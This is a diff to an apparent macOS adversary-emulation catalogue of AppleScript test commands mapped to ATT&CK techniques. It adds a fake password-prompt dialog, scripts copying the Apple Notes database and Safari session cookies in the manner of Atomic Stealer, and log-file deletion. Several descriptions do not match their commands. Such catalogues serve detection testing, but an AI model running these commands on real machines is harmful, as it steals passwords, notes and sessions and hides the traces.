@@ -55,6 +55,17 @@
     "test_number": 3
   },
   {
+    "name": "Display dialog box to capture user password",
+    "command": "display dialog \"#{description}\" with title \"#{title}\" default answer \"\" with icon caution buttons {\"Continue\"} default button \"Continue\" with hidden answer\n",
+    "language": "AppleScript",
+    "elevation_required": false,
+    "tcc_required": true,
+    "description": "Removes a specified login item from the user's login items list. This can be used to clean up persistence mechanisms or remove unwanted autostart entries.",
+    "technique_id": "T1056.002",
+    "technique_name": "Input Capture: GUI Input Capture",
+    "test_number": 1
+  },
+  {
     "name": "Shutdown system (using System Events)",
     "command": "tell application \"System Events\" to shutdown",
     "language": "AppleScript",
@@ -88,19 +99,30 @@
     "test_number": 1
   },
   {
-    "name": "List files and directories",
+    "name": "List files and directories in Macintosh HD",
     "command": "tell application \"Finder\" to get name of every item of folder POSIX file \"#{folderName}\"\n",
     "language": "AppleScript",
     "elevation_required": false,
     "tcc_required": true,
-    "description": "List files and directories using System Events",
+    "description": "Enumerate files and directories in the root filesystem using Finder application via AppleScript",
     "technique_id": "T1083",
     "technique_name": "File and Directory Discovery",
     "test_number": 1
   },
   {
+    "name": "List files and directories in root directory",
+    "command": "list folder \"#{folderName}\"\n",
+    "language": "AppleScript",
+    "elevation_required": false,
+    "tcc_required": false,
+    "description": "Perform directory listing of root filesystem using AppleScript list folder command",
+    "technique_id": "T1083",
+    "technique_name": "File and Directory Discovery",
+    "test_number": 2
+  },
+  {
     "name": "Get system information",
-    "command": "return (system info)\n",
+    "command": "system info\n",
     "language": "AppleScript",
     "elevation_required": false,
     "tcc_required": false,
@@ -111,7 +133,7 @@
   },
   {
     "name": "Get disks",
-    "command": "return (list disks)",
+    "command": "list disks",
     "language": "AppleScript",
     "elevation_required": false,
     "tcc_required": false,
@@ -165,6 +187,17 @@
     "test_number": 1
   },
   {
+    "name": "Copy Apple Notes database",
+    "command": "tell application \"Finder\"\n  set destinationFolderPath to POSIX file \"#{destination_path}\"\n  set notesFolderPath to (path to home folder as text) & \"Library:Group Containers:group.com.apple.notes:\"\n  set notesFolder to folder notesFolderPath\n  set notesFiles to {file \"NoteStore.sqlite\", file \"NoteStore.sqlite-shm\", file \"NoteStore.sqlite-wal\"} of notesFolder\n  repeat with aFile in notesFiles\n    duplicate aFile to folder destinationFolderPath with replacing\n  end repeat\nend tell\n",
+    "language": "AppleScript",
+    "elevation_required": false,
+    "tcc_required": true,
+    "description": "This command will copy Safari BinaryCookies files using AppleScript as seen in Atomic Stealer.",
+    "technique_id": "T1005",
+    "technique_name": "Data from Local System",
+    "test_number": 1
+  },
+  {
     "name": "Create a login item",
     "command": "tell application \"System Events\" to make login item at end with properties {path:\"#{itemPath}\", hidden:\"#{isHidden}\"}\n",
     "language": "AppleScript",
@@ -199,7 +232,7 @@
   },
   {
     "name": "Get user (using environment variable)",
-    "command": "return (system attribute \"USER\")\n",
+    "command": "system attribute \"USER\"\n",
     "language": "AppleScript",
     "elevation_required": false,
     "tcc_required": false,
@@ -210,7 +243,7 @@
   },
   {
     "name": "Get user (using list folder)",
-    "command": "return (list folder \"/Users\")",
+    "command": "list folder \"/Users\"",
     "language": "AppleScript",
     "elevation_required": false,
     "tcc_required": false,
@@ -341,14 +374,14 @@
     "test_number": 1
   },
   {
-    "name": "Display dialog box to capture user password",
-    "command": "display dialog \"#{description}\" with title \"#{title}\" default answer \"\" with icon caution buttons {\"Continue\"} default button \"Continue\" with hidden answer\n",
+    "name": "Copy Safari BinaryCookies",
+    "command": "tell application \"Finder\"\n  set destinationFolderPath to POSIX file \"#{destination_path}\"\n  set safariFolder to ((path to library folder from user domain as text) & \"Containers:com.apple.Safari:Data:Library:Cookies:\")\n  duplicate file \"Cookies.binarycookies\" of folder safariFolder to folder destinationFolderPath with replacing\nend tell\n",
     "language": "AppleScript",
     "elevation_required": false,
     "tcc_required": true,
-    "description": "Removes a specified login item from the user's login items list. This can be used to clean up persistence mechanisms or remove unwanted autostart entries.",
-    "technique_id": "T1059.002",
-    "technique_name": "Command and Scripting Interpreter: AppleScript",
+    "description": "This command will copy Safari BinaryCookies files using AppleScript as seen in Atomic Stealer.",
+    "technique_id": "T1539",
+    "technique_name": "Steal Web Session Cookie",
     "test_number": 1
   },
   {
@@ -360,7 +393,7 @@
     "description": "Opens an application on the system. The application will be in focus after running the command.",
     "technique_id": "T1059.002",
     "technique_name": "Command and Scripting Interpreter: AppleScript",
-    "test_number": 2
+    "test_number": 1
   },
   {
     "name": "Launch application",
@@ -371,7 +404,7 @@
     "description": "Lauches an application on the system. The application will be in the background after running the command.",
     "technique_id": "T1059.002",
     "technique_name": "Command and Scripting Interpreter: AppleScript",
-    "test_number": 3
+    "test_number": 2
   },
   {
     "name": "Close application",
@@ -382,7 +415,18 @@
     "description": "Closes an application on the system.",
     "technique_id": "T1059.002",
     "technique_name": "Command and Scripting Interpreter: AppleScript",
-    "test_number": 4
+    "test_number": 3
+  },
+  {
+    "name": "Delete system log files",
+    "command": "tell application \"Finder\" to delete POSIX file \"#{system_log_path}\"'\n",
+    "language": "AppleScript",
+    "elevation_required": false,
+    "tcc_required": true,
+    "description": "This test deletes the system log file using Finder application.",
+    "technique_id": "T1070.002",
+    "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
+    "test_number": 1
   },
   {
     "name": "Read local hosts file",
